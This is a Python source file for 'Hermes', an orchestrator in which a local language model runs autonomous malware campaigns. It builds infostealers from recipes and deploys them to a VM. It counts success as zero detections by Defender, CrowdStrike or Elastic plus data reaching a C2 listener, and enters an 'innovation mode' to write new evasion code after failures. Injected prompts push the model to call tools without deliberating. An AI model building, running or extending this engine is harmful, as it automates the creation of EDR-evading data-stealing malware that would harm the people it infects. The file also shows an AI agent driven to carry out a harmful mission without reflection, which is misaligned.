"""Hermes orchestrator — AI-driven malware campaign engine."""

import asyncio
import json
import logging
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

from .classifier import classify_failure, FailureType
from .config import get_config
from .innovation import InnovationEngine
from .knowledge_db import KnowledgeDB, OperationRecord
from .llm_client import HermesLLM
from .prompts import (TOOL_DEFINITIONS, INNOVATION_TOOL_DEFINITIONS,
                      build_system_prompt, build_tool_result_message)
from .strategy import StrategyTree
from .tools import ToolExecutor

logger = logging.getLogger(__name__)


# 65K context model: ~15K for system prompt + tools, ~50K for messages
# 4 chars ≈ 1 token, so 50K tokens ≈ 200K chars. Compact at 60% to leave headroom.
_MAX_MESSAGE_CHARS = 120_000
_TOOL_RESULT_CAP = 1500


class HermesSession:
    """Tracks state for a single Hermes orchestration session."""

    def __init__(self, session_id: str, target: dict):
        self.session_id = session_id
        self.target = target
        self.started_at = datetime.now().isoformat()
        self.rounds: list[dict] = []
        self.current_round = 0
        self.status = "initializing"
        self.result: Optional[dict] = None

    def to_dict(self) -> dict:
        return {
            "session_id": self.session_id,
            "target": self.target,
            "started_at": self.started_at,
            "rounds": len(self.rounds),
            "current_round": self.current_round,
            "status": self.status,
        }


class Hermes:
    """Autonomous malware campaign orchestrator.

    Takes a target specification (OS, EDR, malware_type) and orchestrates:
    recon -> plan -> build -> deploy -> analyze -> adapt

    Uses a local LLM (Qwen 35B) for reasoning and the existing assembler
    for building malware from chunk recipes.
    """

    def __init__(self, target_spec: dict, config: dict | None = None):
        self.config = get_config(config)
        self.target = {
            "os": target_spec.get("os", "windows11"),
            "edr": target_spec.get("edr", "none"),
            "malware_type": target_spec.get("malware_type", "infostealer"),
            "network": target_spec.get("network", "nat"),
        }
        self.llm = HermesLLM(
            base_url=self.config["llm_url"],
            model=self.config["llm_model"],
            max_tokens=self.config["llm_max_tokens"],
            temperature=self.config["llm_temperature"],
        )
        self.config["_target_malware_type"] = self.target["malware_type"]
        self.tools = ToolExecutor(self.config)
        self.knowledge = KnowledgeDB.load(Path(self.config["knowledge_db_path"]))
        self.strategy = StrategyTree()
        self.innovation = InnovationEngine(
            threshold=self.config.get("innovation_threshold", 100),
        )
        self.max_rounds = self.config["max_rounds"]
        self._campaign_success = False
        self._success_c2_bytes = 0
        self.messages: list[dict] = []
        self.session = HermesSession(
            session_id=datetime.now().strftime("%Y%m%d_%H%M%S"),
            target=self.target,
        )
        self._callbacks: list = []

    def on_progress(self, callback):
        """Register a callback for progress updates: callback(event_type, data)"""
        self._callbacks.append(callback)

    def _emit(self, event_type: str, data: dict):
        for cb in self._callbacks:
            try:
                cb(event_type, data)
            except Exception:
                pass

    async def run(self) -> dict:
        """Main orchestration loop. Returns the final result dict."""
        logger.info("Hermes session %s starting: %s", self.session.session_id, self.target)
        self.session.status = "running"
        self._emit("session_start", self.session.to_dict())

        try:
            strategy_summary = self.strategy.summary(self.target["edr"])
            knowledge_summary = self.knowledge.summary()

            knowledge_md_path = Path(__file__).parent.parent / "knowledge.md"
            if knowledge_md_path.exists():
                knowledge_md = knowledge_md_path.read_text()
                knowledge_md = self._prioritize_knowledge(knowledge_md, self.target.get("edr", "none"))
                knowledge_summary = f"{knowledge_summary}\n\n{knowledge_md}" if knowledge_summary else knowledge_md

            system_prompt = build_system_prompt(
                self.target, strategy_summary, knowledge_summary
            )
            self.messages = [{"role": "system", "content": system_prompt}]

            initial_msg = (
                f"Begin campaign against target:\n"
                f"- OS: {self.target['os']}\n"
                f"- EDR: {self.target['edr']}\n"
                f"- Malware type: {self.target['malware_type']}\n"
                f"- Network: {self.target['network']}\n\n"
                f"Start with reconnaissance, then plan and execute. "
                f"Use your tools to accomplish the mission."
            )
            self.messages.append({"role": "user", "content": initial_msg})

            consecutive_errors = 0
            MAX_CONSECUTIVE_ERRORS = 5
            consecutive_no_tool = 0
            MAX_NO_TOOL_ROUNDS = 3

            while self.session.current_round < self.max_rounds:
                self.session.current_round += 1
                round_start = time.monotonic()

                logger.info("Round %d/%d", self.session.current_round, self.max_rounds)
                self._emit("round_start", {
                    "round": self.session.current_round,
                    "max_rounds": self.max_rounds,
                })

                self._compact_messages()

                active_tools = self._get_active_tools()
                text, tool_calls = await self.llm.chat(
                    self.messages, tools=active_tools
                )

                assistant_msg: dict = {"role": "assistant"}
                if text:
                    assistant_msg["content"] = text
                if tool_calls:
                    assistant_msg["tool_calls"] = tool_calls
                if not text and not tool_calls:
                    logger.warning("LLM returned empty response in round %d", self.session.current_round)
                    assistant_msg["content"] = ""
                    self.messages.append(assistant_msg)
                    consecutive_no_tool += 1
                    if consecutive_no_tool >= MAX_NO_TOOL_ROUNDS:
                        self._inject_hard_reset()
                        consecutive_no_tool = 0
                    else:
                        self.messages.append({
                            "role": "user",
                            "content": "You returned an empty response. Please continue with the campaign. What's your next step?"
                        })
                    continue

                if text and not tool_calls and len(text) > 300:
                    logger.warning("Deliberation spiral (%d chars, no tool calls) — replacing with summary",
                                   len(text))
                    summary = text[:150].rsplit(" ", 1)[0]
                    assistant_msg["content"] = f"[Considering: {summary}...]"

                self.messages.append(assistant_msg)

                if text:
                    logger.info("Hermes: %s", text[:200])
                    self._emit("reasoning", {"text": text})

                if not tool_calls:
                    consecutive_no_tool += 1
                    if self._check_completion(text):
                        break
                    if consecutive_no_tool >= MAX_NO_TOOL_ROUNDS:
                        logger.warning("LLM stuck: %d rounds without tool calls — injecting hard reset",
                                       consecutive_no_tool)
                        self._emit("stuck_reset", {"consecutive_no_tool": consecutive_no_tool})
                        self._inject_hard_reset()
                        consecutive_no_tool = 0
                    else:
                        self.messages.append({
                            "role": "user",
                            "content": "Do not deliberate. Call a tool RIGHT NOW. Pick: assemble, mutate_recipe, list_recipes, or scan_target."
                        })
                    continue

                consecutive_no_tool = 0

                round_had_error = False
                for tc in tool_calls:
                    tool_name = tc["function"]["name"]
                    try:
                        args = json.loads(tc["function"]["arguments"]) if tc["function"]["arguments"] else {}
                    except json.JSONDecodeError:
                        args = {}

                    logger.info("Executing tool: %s(%s)", tool_name, json.dumps(args)[:100])
                    self._emit("tool_call", {"name": tool_name, "args": args})

                    result = await self.tools.execute(tool_name, args)

                    logger.info("Tool %s result: %s", tool_name, result[:200])
                    self._emit("tool_result", {"name": tool_name, "result": result[:500]})

                    if result.startswith("ERROR:") and ("unreachable" in result or "SSH" in result or "manual intervention" in result):
                        round_had_error = True

                    self._parse_tool_result_for_tracking(tool_name, result)
                    self._handle_innovation_report(tool_name, result)

                    capped = result[:_TOOL_RESULT_CAP] + "\n[... truncated ...]" if len(result) > _TOOL_RESULT_CAP else result
                    self.messages.append(build_tool_result_message(
                        tc["id"], tool_name, capped
                    ))

                if round_had_error:
                    consecutive_errors += 1
                    if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
                        logger.error("Circuit breaker: %d consecutive VM errors, aborting campaign", consecutive_errors)
                        self.messages.append({
                            "role": "user",
                            "content": (
                                f"SYSTEM: The VM has been unreachable for {consecutive_errors} consecutive rounds. "
                                f"This is a persistent infrastructure failure, not a recoverable error. "
                                f"Stop the campaign and report the issue. Do NOT retry scan_target or cleanup_vm."
                            ),
                        })
                        self._emit("circuit_breaker", {"consecutive_errors": consecutive_errors})
                        break
                else:
                    consecutive_errors = 0

                if self._campaign_success:
                    logger.info("Campaign SUCCESS — stopping loop.")
                    pkg = self.tools.package_success(c2_bytes=self._success_c2_bytes)
                    if pkg:
                        logger.info("Package created: %s", pkg)
                        self._emit("package_created", {"path": pkg})
                    self._emit("campaign_success", {"round": self.session.current_round})
                    break

                round_time = time.monotonic() - round_start
                self.session.rounds.append({
                    "round": self.session.current_round,
                    "tool_calls": [tc["function"]["name"] for tc in tool_calls],
                    "duration": round_time,
                })

            self.session.status = "completed"
            result = {
                "session_id": self.session.session_id,
                "target": self.target,
                "rounds": self.session.current_round,
                "status": self.session.status,
                "messages": len(self.messages),
            }
            self.session.result = result
            self._emit("session_complete", result)
            return result

        except Exception as e:
            logger.exception("Hermes session failed")
            self.session.status = "error"
            self._emit("session_error", {"error": str(e)})
            return {
                "session_id": self.session.session_id,
                "status": "error",
                "error": str(e),
            }
        finally:
            await self.llm.close()

    def _parse_tool_result_for_tracking(self, tool_name: str, result: str):
        """Parse tool results to track success/failure for innovation mode and knowledge DB."""
        if tool_name != "analyze_results":
            return

        lower = result.lower()
        has_detections = False
        for marker in ("defender detections:", "crowdstrike detections:", "elastic detections:"):
            if marker in lower and f"{marker} 0" not in lower:
                has_detections = True
                break
        is_success = (
            "verdict: success" in lower
            and "binary exists on vm: true" in lower
            and not has_detections
        )

        recipe_name = getattr(self.tools, "_last_recipe", "unknown")
        fmt = "jscript" if "jscript" in lower or recipe_name.startswith("js_") else "pe"
        failure_type = ""

        if is_success and "c2 data received: 0 bytes" not in lower:
            self.innovation.record_attempt(success=True)
            self._campaign_success = True
            result_str = "SUCCESS"
            c2_match_early = re.search(r'c2 data received:\s*(\d+)', lower)
            self._success_c2_bytes = int(c2_match_early.group(1)) if c2_match_early else 0
        else:
            failure_info = {
                "reason": "unknown",
                "recipe": recipe_name,
                "format": fmt,
                "evasion": [],
            }
            if "quarantine" in lower or "binary exists on vm: false" in lower:
                failure_info["reason"] = "quarantined"
                failure_type = "quarantined"
            elif "c2 data received: 0 bytes" in lower:
                failure_info["reason"] = "no_c2_data"
                failure_type = "no_c2_data"
            elif "detection" in lower:
                failure_info["reason"] = "detected"
                failure_type = "detected"
            else:
                failure_info["reason"] = "other"
                failure_type = "other"

            result_str = "FAILURE"

            should_innovate = self.innovation.record_attempt(failure_info)

            if should_innovate:
                scratch = self.innovation.enter()
                self.tools._innovation_scratch = str(scratch)
                prompt = self.innovation.build_innovation_prompt()
                self.messages.append({"role": "user", "content": prompt})
                self._emit("innovation_mode", {
                    "status": "entered",
                    "failures": self.innovation.consecutive_failures,
                    "scratch_dir": str(scratch),
                })
                logger.info("Innovation mode triggered after %d failures",
                            self.innovation.consecutive_failures)

        import re
        c2_match = re.search(r'c2 data received:\s*(\d+)', lower)
        c2_bytes = int(c2_match.group(1)) if c2_match else 0

        evasion_layers = []
        recipe_path = Path(self.config.get("recipes_dir", "templates/chunks/recipes")) / f"{recipe_name}.yaml"
        if recipe_path.exists():
            try:
                import yaml
                with open(recipe_path) as rf:
                    rdata = yaml.safe_load(rf)
                evasion_layers = rdata.get("evasion", [])
            except Exception:
                pass

        op = OperationRecord(
            timestamp=datetime.now().isoformat(),
            malware_type=self.target.get("malware_type", "unknown"),
            format_type=fmt,
            recipe=recipe_name,
            evasion_layers=evasion_layers,
            edr=self.target.get("edr", "unknown"),
            edr_version="",
            result=result_str,
            c2_bytes=c2_bytes,
            detection_details=result[:500],
            failure_type=failure_type,
        )
        self.knowledge.record_operation(op)
        logger.info("Recorded operation: %s %s (%s, %d bytes)", recipe_name, result_str, failure_type or "clean", c2_bytes)

    def _handle_innovation_report(self, tool_name: str, result: str):
        """Handle save_innovation_report tool result to exit innovation mode."""
        if tool_name != "save_innovation_report" or not self.innovation.in_innovation_mode:
            return

        success = "success" in result.lower() and "failed" not in result.lower()
        technique = ""
        for line in result.split("\n"):
            if "technique" in line.lower():
                technique = line.split(":", 1)[-1].strip() if ":" in line else ""
                break

        self.innovation.exit(success, {"technique": technique, "notes": result})
        self.tools._innovation_scratch = None
        self._emit("innovation_mode", {
            "status": "exited",
            "success": success,
        })

    def _get_active_tools(self) -> list[dict]:
        """Return tool definitions — always includes code-writing tools."""
        tools = list(TOOL_DEFINITIONS)
        tools.extend(INNOVATION_TOOL_DEFINITIONS)
        return tools

    def _check_completion(self, text: str) -> bool:
        if not text:
            return False
        lower = text.lower()
        completion_markers = [
            "campaign success", "campaign complete", "mission complete",
            "mission accomplished", "all data exfiltrated",
            "success confirmed", "giving up", "exhausted all options", "cannot proceed",
        ]
        return any(m in lower for m in completion_markers)

    @staticmethod
    def _prioritize_knowledge(text: str, edr: str, budget: int = 24000) -> str:
        """Extract the most relevant sections from knowledge.md for the target EDR.

        Instead of dumb truncation, prioritize sections by relevance:
        1. Always-relevant: Critical bugs, false positives, deployment checklist
        2. EDR-specific: CrowdStrike/Elastic/Defender sections matching the target
        3. General: Architecture, recipes, evasion chunks
        """
        import re
        if len(text) <= budget:
            return text

        sections = re.split(r'(?=^## )', text, flags=re.MULTILINE)

        # Keywords that indicate high priority for this EDR
        edr_keywords = {
            "crowdstrike": ["crowdstrike", "cs ", "falcon", "pe with resources", "proven"],
            "defender": ["defender", "amsi", "etw", "tamper"],
            "elastic": ["elastic", "eql", "kql", "zero-child"],
            "none": [],
        }
        edr_kw = edr_keywords.get(edr, [])

        always_keep = ["critical", "false positive", "checklist", "c2 server",
                       "output organization", "debugging"]

        priority = []  # (score, section)
        for sec in sections:
            sec_lower = sec[:500].lower()
            score = 0
            # EDR-specific sections get highest priority
            if any(kw in sec_lower for kw in edr_kw):
                score = 3
            # Always-relevant sections
            elif any(kw in sec_lower for kw in always_keep):
                score = 2
            # General useful content
            elif any(kw in sec_lower for kw in ("evasion", "recipe", "proven", "binary", "deploy")):
                score = 1
            else:
                score = 0
            priority.append((score, sec))

        # Sort by priority (highest first), then build up to budget
        priority.sort(key=lambda x: -x[0])
        result_parts = []
        total = 0
        for score, sec in priority:
            if total + len(sec) > budget:
                remaining = budget - total
                if remaining > 500 and score >= 2:
                    result_parts.append(sec[:remaining] + "\n[... section truncated ...]")
                    total += remaining
                break
            result_parts.append(sec)
            total += len(sec)

        return "\n".join(result_parts)

    def _inject_hard_reset(self):
        """Inject a hard reset when the LLM is stuck in a no-tool loop."""
        logger.info("Injecting hard reset — LLM stuck without calling tools")
        # Drop recent no-tool messages to break the loop
        trimmed = 0
        while len(self.messages) > 3:
            last = self.messages[-1]
            if last.get("role") == "user" and "tool" in last.get("content", "").lower():
                self.messages.pop()
                trimmed += 1
            elif last.get("role") == "assistant" and "tool_calls" not in last:
                self.messages.pop()
                trimmed += 1
            else:
                break
            if trimmed >= 10:
                break

        self.messages.append({
            "role": "user",
            "content": (
                "SYSTEM RESET: You have been deliberating without calling tools for multiple rounds. "
                "Stop reasoning and ACT. Pick ONE of these actions RIGHT NOW:\n"
                "1. assemble — build a recipe\n"
                "2. list_recipes — see what's available\n"
                "3. scan_target — check the VM\n"
                "4. query_knowledge — check what worked before\n\n"
                "Call a tool in your NEXT response. Do NOT explain your plan — just call the tool."
            ),
        })

    def _compact_messages(self):
        """Trim old messages to stay within the LLM's context budget.

        Uses character count as a proxy for tokens (4 chars ≈ 1 token).
        Also truncates oversized tool results to _TOOL_RESULT_CAP.
        """
        # First pass: truncate any oversized tool results
        for m in self.messages:
            if m.get("role") == "tool":
                content = m.get("content", "")
                if len(content) > _TOOL_RESULT_CAP:
                    m["content"] = content[:_TOOL_RESULT_CAP] + "\n[... truncated ...]"

        total_chars = sum(len(m.get("content", "")) for m in self.messages)
        if total_chars <= _MAX_MESSAGE_CHARS:
            return

        system_msgs = [m for m in self.messages if m["role"] == "system"]
        non_system = [m for m in self.messages if m["role"] != "system"]

        if len(non_system) <= 10:
            return

        # Keep first 2 (initial prompt) and trim from the middle
        keep_head = non_system[:2]
        keep_tail = non_system[-20:]

        # If still over budget, reduce tail further
        while len(keep_tail) > 6:
            tail_chars = sum(len(m.get("content", "")) for m in keep_tail)
            head_chars = sum(len(m.get("content", "")) for m in keep_head)
            sys_chars = sum(len(m.get("content", "")) for m in system_msgs)
            if sys_chars + head_chars + tail_chars + 500 <= _MAX_MESSAGE_CHARS:
                break
            keep_tail = keep_tail[2:]  # drop 2 oldest from tail

        dropped = len(non_system) - len(keep_head) - len(keep_tail)
        summary_msg = {
            "role": "user",
            "content": (
                f"[CONTEXT COMPACTED: {dropped} earlier messages trimmed. "
                f"Round {self.session.current_round}/{self.max_rounds}. "
                f"Continue the campaign — call a tool.]"
            ),
        }

        self.messages = system_msgs + keep_head + [summary_msg] + keep_tail
        new_total = sum(len(m.get("content", "")) for m in self.messages)
        logger.info("Context compacted: dropped %d messages, %d->%d chars (~%d->%d tokens)",
                     dropped, total_chars, new_total, total_chars // 4, new_total // 4)


    async def stream(self, user_msg: str, config: dict | None = None):
        """Async generator yielding events for the Web UI chat panel.

        If this is a fresh session, initializes with the target from config.
        Accepts free-form chat or autonomous run commands.
        """
        if config:
            self.target.update({
                k: v for k, v in {
                    "edr": config.get("edr"),
                    "malware_type": config.get("malware_type"),
                }.items() if v
            })
            fmt = config.get("format")
            if fmt and fmt != "auto":
                self.target["preferred_format"] = fmt
            if "max_rounds" in config:
                self.max_rounds = int(config["max_rounds"])
            if "innovation_threshold" in config:
                self.innovation.threshold = int(config["innovation_threshold"])

        if not self.messages:
            strategy_summary = self.strategy.summary(self.target["edr"])
            knowledge_summary = self.knowledge.summary()
            system_prompt = build_system_prompt(
                self.target, strategy_summary, knowledge_summary
            )
            self.messages = [{"role": "system", "content": system_prompt}]

        _auto_keywords = ("autonomous", "auto run", "campaign", "run campaign",
                          "start campaign", "build", "deploy", "test")
        is_auto = any(kw in user_msg.lower() for kw in _auto_keywords)
        self.messages.append({"role": "user", "content": user_msg})

        max_turns = self.max_rounds if is_auto else 20
        consecutive_errors = 0
        MAX_CONSECUTIVE_ERRORS = 5
        consecutive_no_tool = 0
        MAX_NO_TOOL_ROUNDS = 3

        for turn in range(max_turns):
            yield {"type": "status", "content": "thinking...", "round": turn + 1, "max_rounds": max_turns}

            if len(self.messages) > 80:
                self._compact_messages()

            try:
                active_tools = self._get_active_tools()
                text, tool_calls = await self.llm.chat(
                    self.messages, tools=active_tools
                )
            except Exception as e:
                yield {"type": "error", "content": f"LLM error: {e}"}
                return

            assistant_msg = {"role": "assistant"}
            if text:
                assistant_msg["content"] = text
            if tool_calls:
                assistant_msg["tool_calls"] = tool_calls
            if not text and not tool_calls:
                assistant_msg["content"] = ""
                self.messages.append(assistant_msg)
                consecutive_no_tool += 1
                if consecutive_no_tool >= MAX_NO_TOOL_ROUNDS:
                    self._inject_hard_reset()
                    consecutive_no_tool = 0
                    continue
                break

            if text and not tool_calls and len(text) > 300:
                logger.warning("Stream: deliberation spiral (%d chars, no tool calls) — replacing", len(text))
                summary = text[:150].rsplit(" ", 1)[0]
                assistant_msg["content"] = f"[Considering: {summary}...]"

            self.messages.append(assistant_msg)

            if text:
                yield {"type": "text", "content": text}

            if not tool_calls:
                consecutive_no_tool += 1
                if self._check_completion(text):
                    break
                if is_auto and consecutive_no_tool >= MAX_NO_TOOL_ROUNDS:
                    logger.warning("Stream: LLM stuck %d rounds without tools — hard reset",
                                   consecutive_no_tool)
                    yield {"type": "status", "content": "LLM stuck — injecting reset..."}
                    self._inject_hard_reset()
                    consecutive_no_tool = 0
                    continue
                if is_auto:
                    self.messages.append({
                        "role": "user",
                        "content": "Do not deliberate. Call a tool RIGHT NOW. Pick: assemble, mutate_recipe, list_recipes, or scan_target."
                    })
                    continue
                break

            consecutive_no_tool = 0

            round_had_error = False
            for tc in tool_calls:
                tool_name = tc["function"]["name"]
                try:
                    args = json.loads(tc["function"]["arguments"]) if tc["function"]["arguments"] else {}
                except json.JSONDecodeError:
                    args = {}

                yield {"type": "status", "content": f"running {tool_name}..."}

                result = await self.tools.execute(tool_name, args)

                yield {"type": "tool_call", "name": tool_name,
                       "result": result[:2000] if len(result) > 2000 else result}

                if result.startswith("ERROR:") and ("unreachable" in result or "SSH" in result or "manual intervention" in result):
                    round_had_error = True

                self._parse_tool_result_for_tracking(tool_name, result)
                self._handle_innovation_report(tool_name, result)

                capped = result[:_TOOL_RESULT_CAP] + "\n[... truncated ...]" if len(result) > _TOOL_RESULT_CAP else result
                self.messages.append(build_tool_result_message(
                    tc["id"], tool_name, capped
                ))

            if round_had_error:
                consecutive_errors += 1
                if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
                    self.messages.append({
                        "role": "user",
                        "content": (
                            f"SYSTEM: The VM has been unreachable for {consecutive_errors} consecutive rounds. "
                            f"Stop the campaign — do NOT retry."
                        ),
                    })
                    yield {"type": "error", "content": f"Circuit breaker: VM unreachable for {consecutive_errors} rounds"}
                    return
            else:
                consecutive_errors = 0

            if self._campaign_success:
                pkg = self.tools.package_success(c2_bytes=self._success_c2_bytes)
                msg = "Campaign SUCCESS — payload deployed, C2 data received, zero detections."
                if pkg:
                    msg += f"\nPackage: {pkg}"
                yield {"type": "complete", "content": msg}
                return

            if is_auto and self._check_completion(text or ""):
                yield {"type": "complete", "content": "Campaign completed successfully."}
                return

        if is_auto:
            yield {"type": "complete", "content": f"Session paused after {max_turns} rounds."}


    async def run_validation(self, recipe_names: list[str] | None = None) -> dict:
        """Test all proven-PASS recipes mechanically (no LLM). Returns report."""
        logger.info("Validation mode: testing proven recipes against %s", self.target["edr"])
        self._emit("session_start", {"mode": "validate", **self.session.to_dict()})

        rr_path = Path(self.config.get("results_dir", "results")) / "recipe_results.json"
        if not rr_path.exists():
            return {"mode": "validate", "error": "No recipe_results.json found", "results": []}

        data = json.loads(rr_path.read_text())
        all_results = data.get("results", [])

        if recipe_names:
            targets = [r for r in all_results if r.get("verdict") == "PASS"
                       and r.get("recipe") in recipe_names
                       and r.get("edr", "") == self.target["edr"]]
        else:
            targets = [r for r in all_results if r.get("verdict") == "PASS"
                       and r.get("edr", "") == self.target["edr"]]

        seen = set()
        unique_targets = []
        for r in targets:
            key = (r["recipe"], r.get("format", ""))
            if key not in seen:
                seen.add(key)
                unique_targets.append(r)

        if not unique_targets:
            return {"mode": "validate", "edr": self.target["edr"],
                    "error": "No PASS recipes found for this EDR", "results": []}

        logger.info("Found %d unique proven recipes to validate", len(unique_targets))
        self._emit("validation_start", {"total": len(unique_targets)})

        results = []
        for i, entry in enumerate(unique_targets):
            recipe = entry["recipe"]
            fmt = entry.get("format", "pe_resources")
            is_jscript = fmt == "jscript" or recipe.startswith("js_")

            logger.info("[%d/%d] Testing recipe: %s (%s)", i + 1, len(unique_targets), recipe, fmt)
            self._emit("validation_progress", {
                "current": i + 1, "total": len(unique_targets),
                "recipe": recipe, "format": fmt,
            })

            result_entry = {
                "recipe": recipe, "format": fmt,
                "verdict": None, "c2_bytes": 0,
                "binary_exists": False, "failure_analysis": None,
            }

            try:
                assemble_result = await self.tools.tool_assemble(recipe, compile=not is_jscript)
                if assemble_result.startswith("ERROR"):
                    result_entry["verdict"] = "BUILD_ERROR"
                    result_entry["failure_analysis"] = assemble_result
                    results.append(result_entry)
                    continue

                import re
                if is_jscript:
                    m = re.search(r'Assembled JScript:\s*(\S+)', assemble_result)
                else:
                    m = re.search(r'Assembled and compiled:\s*(\S+)', assemble_result)
                if not m:
                    result_entry["verdict"] = "BUILD_ERROR"
                    result_entry["failure_analysis"] = f"Could not parse output path: {assemble_result[:200]}"
                    results.append(result_entry)
                    continue
                binary_path = m.group(1)
                binary_name = Path(binary_path).name

                await self.tools.tool_start_c2_listener(port=9001, protocol="auto")
                await self.tools.tool_deploy_to_vm(local_path=binary_path, execute=True,
                                                    execute_via="cscript" if is_jscript else "direct")
                await asyncio.sleep(15)

                analysis = await self.tools.tool_analyze_results(binary_name, c2_port=9001)

                verdict_m = re.search(r'Verdict:\s*(\S+)', analysis)
                c2_m = re.search(r'C2 data received:\s*(\d+)', analysis)
                exists_m = re.search(r'Binary exists on VM:\s*(True|False)', analysis)

                verdict = verdict_m.group(1) if verdict_m else "UNKNOWN"
                c2_bytes = int(c2_m.group(1)) if c2_m else 0
                binary_exists = exists_m.group(1) == "True" if exists_m else False

                is_pass = verdict == "SUCCESS" and binary_exists and c2_bytes > 0
                result_entry["verdict"] = "PASS" if is_pass else f"FAIL_{verdict}"
                result_entry["c2_bytes"] = c2_bytes
                result_entry["binary_exists"] = binary_exists

                if not is_pass:
                    fa = await self.tools.tool_analyze_detection(
                        verdict=verdict, binary_exists=binary_exists,
                        c2_bytes=c2_bytes,
                    )
                    result_entry["failure_analysis"] = fa

            except Exception as e:
                logger.exception("Error testing recipe %s", recipe)
                result_entry["verdict"] = "ERROR"
                result_entry["failure_analysis"] = str(e)

            results.append(result_entry)

            try:
                await self.tools.tool_cleanup_vm()
            except Exception:
                pass
            await asyncio.sleep(2)

        still_pass = [r for r in results if r["verdict"] == "PASS"]
        newly_failed = [r for r in results if r["verdict"] and r["verdict"] != "PASS"]

        report = {
            "mode": "validate",
            "edr": self.target["edr"],
            "timestamp": datetime.now().isoformat(),
            "summary": {
                "total_tested": len(results),
                "still_pass": len(still_pass),
                "newly_failed": len(newly_failed),
            },
            "results": results,
            "still_working": [r["recipe"] for r in still_pass],
            "detected": [{"recipe": r["recipe"], "verdict": r["verdict"],
                          "analysis": r.get("failure_analysis", "")} for r in newly_failed],
        }

        report_path = Path(self.config.get("results_dir", "results")) / "validation_report.json"
        report_path.write_text(json.dumps(report, indent=2))
        logger.info("Validation complete: %d/%d still pass. Report: %s",
                     len(still_pass), len(results), report_path)
        self._emit("validation_complete", report["summary"])

        await self.llm.close()
        return report

    async def run_evade(self, recipe_names: list[str], max_rounds: int = 50) -> dict:
        """LLM-driven evasion loop for specific recipes."""
        self.target["mode"] = "evade"
        self.target["recipes"] = recipe_names
        self.max_rounds = max_rounds
        return await self.run()


async def run_session(target_spec: dict, config: dict | None = None, progress_callback=None) -> dict:
    """Entry point for the web portal. Runs a full Hermes session."""
    hermes = Hermes(target_spec, config)
    if progress_callback:
        hermes.on_progress(progress_callback)
    return await hermes.run()
